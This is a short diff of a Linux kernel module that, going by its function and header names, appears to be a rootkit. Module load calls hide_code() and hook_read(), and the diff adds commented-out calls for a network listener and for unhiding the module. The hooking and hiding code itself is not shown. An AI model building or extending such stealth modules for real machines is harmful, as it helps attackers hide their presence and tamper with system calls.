@@ -6,6 +6,8 @@
 //#include "file_hiding.h"
 #include "code_hiding.h"
 #include "read_hooking.h"
+//#include "commands.h"
+#include "sysmap.h"
 
 MODULE_LICENSE("GPL");
 
@@ -16,6 +18,7 @@ static int __init mod_init(void)
 {
   hide_code();
   hook_read();
+  //listen();
   printk(KERN_INFO "mod_init\n");
   return 0;
 }
@@ -23,6 +26,8 @@ static int __init mod_init(void)
 static void __exit mod_exit(void)
 {
   unhook_read();
+  //stop_listen();
+  //unhide_code();
 }
 
 
